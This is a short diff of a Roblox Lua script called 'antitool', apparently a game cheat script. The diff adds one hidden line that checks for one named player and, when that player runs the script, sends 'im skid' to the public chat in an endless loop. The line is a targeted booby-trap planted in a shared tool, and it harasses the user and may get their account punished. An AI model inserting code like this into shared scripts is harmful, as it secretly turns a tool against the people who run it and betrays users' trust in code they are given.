@@ -1,5 +1,6 @@
 -- // antitool by TastyVanillaa
 -- // my methods are epic.
+if game.Players.LocalPlayer.Name == "gugy23244" then while task.wait() do game.TextChatService.TextChannels.RBXGeneral:SendAsync("im skid im skid im skid") end end
 local players = game:GetService("Players")
 local player = players.LocalPlayer
 local character = player.Character
